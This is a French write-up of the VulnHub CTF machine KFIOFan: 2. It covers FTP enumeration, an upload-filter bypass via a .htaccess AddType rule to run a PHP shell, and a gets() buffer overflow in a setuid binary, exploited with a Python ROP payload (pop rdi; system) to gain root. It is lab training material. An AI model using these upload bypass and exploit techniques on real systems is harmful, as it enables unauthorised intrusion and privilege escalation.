---
title: "Solution du CTF KFIOFan: 2 de VulnHub"
tags: [CTF, VulnHub]
---

[KFIOFan: 2](https://vulnhub.com/entry/ctf-kfiofan-2,325/) est le second CTF de *Khaos Farbauti Ibn Oblivion*. Il a été mis en ligne en juin 2019 sur *VulnHub*.

On avance sur le CTF via une série d'épreuves qui nous ouvrent peu à peu les portes jusqu'au compte root. Ce n'est pas toujours facile de comprendre ce qu'il faut faire exactement.

## Sésame, ouvre toi !

Ub scan de port ne révèle qu'un seveur FTP :

```
Nmap scan report for 192.168.56.171
Host is up (0.00015s latency).
Not shown: 65534 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
26921/tcp open  ftp     vsftpd 2.0.8 or later
```

A la racine, 4 images png qui correspondent à une image vraisemblablement découpée et un dossier `serrure` dans lequel on peut déposer des fichiers.

Si on active les logs détaillés dans le client FTP on peut voir le `motd` du serveur, mais ça ne nous avance pas plus.

```
Statut :	Connexion à 192.168.56.171:26921…
Statut :	Connexion établie, attente du message d’accueil…
Réponse :	220 Salut Alice ! Suite a l'attaque sur notre precedent serveur, j'en prepare un nouveau qui sera bien plus securise ! C'est en travaux pour l'instant donc s'il te plait ne touche a rien pour l'instant... Bob
Commande :	AUTH TLS
Réponse :	530 Please login with USER and PASS.
Commande :	AUTH SSL
Réponse :	530 Please login with USER and PASS.
Statut :	Serveur non sécurisé, celui‐ci ne prend pas en charge FTP sur TLS.
Commande :	USER anonymous
Réponse :	331 Please specify the password.
Commande :	PASS *********************
Réponse :	230 Login successful.
```

Je vais utiliser `convert` d'*ImageMagick* pour recoller les différentes parties de l'image. J'avais déjà utilisé cet utilitaire sur le CTF *Securitech* en 2006 où il fallait recoller une image découpée en bandelettes (comme si elle était passée dans un destructeur de documents, il fallait aussi les remettre dans l'ordre).

```console
convert +append 1.png 4.png top.png
convert +append 2.png 3.png bottom.png
convert -append top.png bottom.png final.png
```

Une fois l'image recréée, je zoome et voit marqué `cle.txt` au milieu de l'image.

Si on uploade un fichier `cle.txt` dans le dossier `serrure` on trouve un autre port ouvert sur la machine :

```
26980/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

Mais on est bloqué par la page d'index :

```html
<!DOCTYPE html>
<html>
<body>
<!-- Test présence fichier cle.txt : OK -->
<!-- Test contenu fichier cle.txt  : Erreur -->
<p>Tout ce qui est, est père du mensonge et fils du néant</p>
</body>
</html>
```

Via une énumération je trouve un dossier `/uploads/` mais il est vide :

```
200       15l       49w      748c http://192.168.56.171:26980/uploads/
200       13l       26w      626c http://192.168.56.171:26980/manual/
403       11l       32w      298c http://192.168.56.171:26980/icons/
403       11l       32w      306c http://192.168.56.171:26980/server-status/
```

Finalement en cherchant le message de la page d'index je tombe sur ce blog :

[&quot;Farbauti&quot; ? &quot;Ibn Oblivion&quot; ? - Tout le bonheur du monde 2.0](https://blog.chaosklub.com/post/2005/09/29/256-farbauti-ibn-oblivion)

Il laisse supposer que le contenu du fichier `cle.txt` doit être `Khaos Farbauti Ibn Oblivion`.

Une fois placé le bon contenu dans le FTP, on parvient à une page d'upload mais l'extension `.php` est refusée et les extensions `.php3`, `.phtml`, `.phar` ne sont pas interprétées.

L'extension `.phps` passe l'upload mais on obtient une erreur 403 à l'accès.

J'ai utilisé une astuce dont je me suis déjà servi sur d'autres CTFs à savoir uploader un fichier `.htaccess` permettant de lier l'interpréteur PHP à une nouvelle extension :

```
AddType application/x-httpd-php .yo
```

Après ça je peux uploader un `shell.yo` et le code PHP est bien interprété.

Je trouve alors une clé SSH dans `/var/www` :

```
-rwxr-xr-x  1 bob  bob  1675 May 12  2019 id_rsa.bak
```

Un port est aussi apparu entre temps :

```
26922/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
```

## Bob's not dead

On peut se connecter avec l'utilisateur `Bob` qui dispose d'un binaire setuid root dans son dossier personnel :

```console
$ ssh -i bob.key -p 26922 bob@192.168.56.171
Linux kfiofan2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64
                         __,,,,_
          _ __..-;''`--/'/ /.',-`-.
      (`/' ` |  \ \ \\ / / / / .-'/`,_
     /'`\ \   |  \ | \| // // / -.,/_,'-,
    /<7' ;  \ \  | ; ||/ /| | \/    |`-/,/-.,_,/')
   /  _.-, `,-\,__|  _-| / \ \/|_/  |    '-/.;.\'
   `-`  f/ ;      / __/ \__ `/ |__/ |
        `-'      |  -| =|\_  \  |-' |
              __/   /_..-' `  ),'  //
             ((__.-'((___..-'' \__.'

Last login: Mon May 13 11:29:06 2019 from 192.168.1.2
bob@kfiofan2:~$ id
uid=1000(bob) gid=1000(bob) groupes=1000(bob)
bob@kfiofan2:~$ ls
peda  test  todo.txt
bob@kfiofan2:~$ cat todo.txt 
- Chercher moteur de blog sécurisé 
- Demander à Alice la charte graphique
- Voir pourquoi gcc dit que gets est dangereux
- Chercher Khaos avec Maltego
- Acheter un kebab
- Envoyer fanfic sur le Fauve
bob@kfiofan2:~$ ls -al test
-rwsr-xr-x 1 root root 8936 mai   13  2019 test
bob@kfiofan2:~$ nm test
0000000000201058 B __bss_start
0000000000201058 b completed.6972
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000201048 D __data_start
0000000000201048 W data_start
0000000000000820 T debug
0000000000000720 t deregister_tm_clones
00000000000007b0 t __do_global_dtors_aux
0000000000200de0 t __do_global_dtors_aux_fini_array_entry
0000000000201050 D __dso_handle
0000000000200df0 d _DYNAMIC
0000000000201058 D _edata
0000000000201060 B _end
0000000000000934 T _fini
00000000000007f0 t frame_dummy
0000000000200dd8 t __frame_dummy_init_array_entry
0000000000000ba8 r __FRAME_END__
                 U getchar@@GLIBC_2.2.5
                 U gets@@GLIBC_2.2.5
0000000000201000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
0000000000000a38 r __GNU_EH_FRAME_HDR
0000000000000650 T _init
0000000000200de0 t __init_array_end
0000000000200dd8 t __init_array_start
0000000000000940 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000200de8 d __JCR_END__
0000000000200de8 d __JCR_LIST__
                 w _Jv_RegisterClasses
0000000000000930 T __libc_csu_fini
00000000000008c0 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
000000000000085c T main
                 U printf@@GLIBC_2.2.5
                 U puts@@GLIBC_2.2.5
0000000000000760 t register_tm_clones
00000000000006f0 T _start
                 U strcmp@@GLIBC_2.2.5
                 U system@@GLIBC_2.2.5
0000000000201058 D __TMC_END__ 
bob@kfiofan2:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

Comme on peut le voir, la stack n'est pas randomisée et `system` fait partie des fonctions importées par le binaire.

En revanche `NX` est activé sur l'exécutable. On ne pourra donc pas mettre un shellcode sur la stack.

```console
$ checksec --file test
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   test
```

Je peux balancer une chaine cyclique générée par `pwntools` à l'exécutable qui lit un input via `gets()` :

```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7b15910 (<__read_nocancel+7>:       cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7dd5770 --> 0x0 
RSI: 0xa ('\n')
RDI: 0x0 
RBP: 0x6661616165616161 ('aaaeaaaf')
RSP: 0x7fffffffe5b8 ("aaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacf"...)
RIP: 0x5555555548bd (<main+97>: ret)
R8 : 0x7ffff7dd5760 --> 0x0 
R9 : 0x7ffff7fef440 (0x00007ffff7fef440)
R10: 0x35c 
R11: 0x246 
R12: 0x5555555546f0 (<_start>:  xor    ebp,ebp)
R13: 0x7fffffffe690 ("aackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaej"...)
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555548b2 <main+86>:    call   0x5555555546c0 <getchar@plt>
   0x5555555548b7 <main+91>:    mov    eax,0x0
   0x5555555548bc <main+96>:    leave  
=> 0x5555555548bd <main+97>:    ret    
   0x5555555548be:      xchg   ax,ax
   0x5555555548c0 <__libc_csu_init>:    push   r15
   0x5555555548c2 <__libc_csu_init+2>:  push   r14
   0x5555555548c4 <__libc_csu_init+4>:  mov    r15d,edi
```

On voit qu'au moment de l'instruction `ret` on contrôle ce qui se trouve sur la pile (registre `rsp`).

Je détermine via `pwntools` que `rip` est écrasé à l'offset 21 de notre buffer.

Ensuite j'ai remarqué la chaine de caractères suivante dans l'exécutable à l'adresse `0x55555555495b` : `touch /root/authorize_bob`

Je suppose qu'exécuter cette commande nous ouvrira une porte supplémentaire.

L'adresse de `system` est `0x7ffff7a79480`. Comme on est en 64bits il faut placer l'argument de `system` dans `rdi` ce qui se fait avec le gadget suivant :

```
gdb-peda$ x/2i 0x555555554923
   0x555555554923 <__libc_csu_init+99>: pop    rdi
   0x555555554924 <__libc_csu_init+100>:        ret
```

En bref je génère un input de cette façon :

```python
import struct

pop_rdi_ret = 0x555555554923
authorize_bob = 0x55555555495b
system = 0x7ffff7a79480

with open("input", "wb") as fd:
        fd.write(b"A" * 21)
        fd.write(struct.pack("<q", pop_rdi_ret))
        fd.write(struct.pack("<q", authorize_bob))
        fd.write(struct.pack("<q", system))
        fd.write(b"\n")
```

Via `gdb` je vérifie que la stack est organisée comme je le souhaite au moment de l'exploitation (`./test < input`) :

```
[-------------------------------------code-------------------------------------]
   0x5555555548b2 <main+86>:    call   0x5555555546c0 <getchar@plt>
   0x5555555548b7 <main+91>:    mov    eax,0x0
   0x5555555548bc <main+96>:    leave  
=> 0x5555555548bd <main+97>:    ret    
   0x5555555548be:      xchg   ax,ax
   0x5555555548c0 <__libc_csu_init>:    push   r15
   0x5555555548c2 <__libc_csu_init+2>:  push   r14
   0x5555555548c4 <__libc_csu_init+4>:  mov    r15d,edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe5b8 --> 0x555555554923 (<__libc_csu_init+99>:  pop    rdi)
0008| 0x7fffffffe5c0 --> 0x55555555495b ("touch /root/authorize_bob")
0016| 0x7fffffffe5c8 --> 0x7ffff7a79480 (<__libc_system>:       test   rdi,rdi)
```

Tout est nickel. Je surveille les processus avec `pspy` et voit que `bob` est rajouté au groupe `sudo` :

```
2023/04/11 13:00:01 CMD: UID=0    PID=6240   | /usr/sbin/CRON -f 
2023/04/11 13:00:01 CMD: UID=0    PID=6252   | /bin/bash /root/check_uploads.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6251   | /bin/bash /root/check_uploads.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6250   | /bin/bash /root/check_apache.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6249   | /bin/sh -c /root/turnoff_alsr.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6248   | /bin/bash /root/check_uploads.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6247   | /bin/bash /root/check_sudo.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6246   | /bin/bash /root/check_apache.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6245   | /bin/sh -c /root/turnoff_alsr.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6244   | /bin/bash /root/check_uploads.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6243   | /bin/bash /root/check_sudo.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6242   | /bin/sh -c /root/check_apache.sh 
2023/04/11 13:00:01 CMD: UID=0    PID=6257   | /usr/sbin/usermod -G sudo bob
```

Une fois déconnecté puis reconnecté je peux passer root :

```console
bob@kfiofan2:~$ sudo -l
Entrées par défaut pour bob sur kfiofan2 :
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

L'utilisateur bob peut utiliser les commandes suivantes sur kfiofan2 :
    (ALL : ALL) NOPASSWD: ALL
bob@kfiofan2:~$ sudo su
root@kfiofan2:/home/bob# cd /root
root@kfiofan2:~# ls
authorize_bob  check_apache.sh  check_sudo.sh  check_uploads.sh  clean_start.sh  fauve_dbg.c  flag.txt  htaccess_orig  turnoff_alsr.sh
root@kfiofan2:~# cat flag.txt
Bravo à toi pour avoir vaincu le serveur de Bob, ce n'était pas si simple et tu y es parvenu !

Reprend des forces et à bientôt peut-être pour un CTF KFIOFan3 ! ;)

_____.___.                  .___.__    .___ .__  __   
\__  |   | ____  __ __    __| _/|__| __| _/ |__|/  |_ 
 /   |   |/  _ \|  |  \  / __ | |  |/ __ |  |  \   __\
 \____   (  <_> )  |  / / /_/ | |  / /_/ |  |  ||  |  
 / ______|\____/|____/  \____ | |__\____ |  |__||__|  
 \/                          \/         \/       


```

## commentcamarche.net

Dans la crontab de root on trouve différents scripts appelés comme `clean_start.sh` :

```bash
#!/bin/bash

/bin/rm -f /srv/ftp/serrure/*
/bin/rm -f /var/www/html/uploads/*
/bin/rm -f /root/authorize_bob
/bin/cp -f /root/htaccess_orig /var/www/html/uploads/.htaccess
/bin/chown www-data:www-data /var/www/html/uploads/.htaccess
```

Il remet tout à l'état initial. Je remarque qu'il plaçait un htaccess :

```
php_flag engine off
```

Du coup juste écraser le htaccess, même avec un fichier vide, aurait pu nous permettre d'obtenir l'exécution de code PHP.

Ensuite il y a le script `check_apache.sh` qui lance le serveur web si le fichier `cle.txt` est présent :

```bash
#!/bin/bash
service=apache2
fichier=/srv/ftp/serrure/cle.txt

if (( $(ps -ef |grep -v grep |grep $service |wc -l) == 0 ))
then
if [ -f $fichier ]
then
/bin/systemctl start $service
fi
else
if [ ! -f $fichier ]
then
/bin/systemctl stop $service
fi
fi
```

Et finalement le code du programme vulnérable :

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int debug(void)
{
    printf("\n lancement debug \n");
    int status = system("touch /root/authorize_bob");
    printf("\n code retour : %d\n", status);
}

int main(void)
{
    char buff[13];

    printf("\n Mot de passe : \n");
    gets(buff);

    if(strcmp(buff, "aliceestnulle"))
    {
        printf ("\n Mauvais mot de passe \n");
    }
    else
    {
        printf ("\n Car voici le Fauve enragé \n Qui en mon coeur survit. \n Idole d'un monde passé, \n Dieu d'un pays englouti. \n");
    }

    getchar();

    return 0;
}
```

On voit qu'il y avait une méthode plus simple qui consistait à simplement écraser l'adresse de retour par l'adresse de la fonction `debug` (mais c'est moins fun).
